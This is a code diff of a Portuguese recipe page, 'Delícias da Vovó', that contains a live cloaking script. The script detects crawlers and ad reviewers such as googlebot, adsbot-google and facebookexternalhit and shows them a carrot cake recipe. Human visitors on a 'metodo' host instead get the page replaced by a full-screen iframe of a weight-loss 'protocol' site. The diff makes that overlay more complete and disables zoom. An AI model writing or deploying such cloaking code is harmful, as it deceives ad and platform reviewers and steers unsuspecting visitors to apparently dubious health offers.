@@ -2,11 +2,27 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Delícias da Vovó</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; }
-        iframe { border: none; width: 100vw; height: 100vh; }
+        /* Remove qualquer margem que possa empurrar o conteúdo para o lado */
+        html, body { 
+            margin: 0 !important; 
+            padding: 0 !important; 
+            width: 100% !important; 
+            height: 100% !important; 
+            overflow: hidden !important; 
+        }
+        /* O segredo: largura de 100% fixa e box-sizing para evitar que bordas estiquem a tela */
+        iframe { 
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100% !important; 
+            height: 100% !important; 
+            border: none !important; 
+            box-sizing: border-box !important;
+        }
         .safe-content { padding: 20px; font-family: sans-serif; }
     </style>
 </head>
@@ -17,17 +33,14 @@
     const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
 
     if (currentHost.includes('metodo') && !isBot) {
-        document.write('<iframe src="https://protocoloemagrecimentodivino.lovable.app/"></iframe>');
+        // Injeção direta para garantir que o Iframe herde o viewport correto
+        document.body.innerHTML = '<iframe src="https://protocoloemagrecimentodivino.lovable.app/" allowfullscreen></iframe>';
     }
 </script>
 
 <div class="safe-content">
     <h1>O Melhor Bolo de Cenoura Perfeito</h1>
     <p>Esta é a receita tradicional da família...</p>
-    <ul>
-        <li>3 cenouras</li>
-        <li>3 ovos</li>
-    </ul>
 </div>
 
 </body>
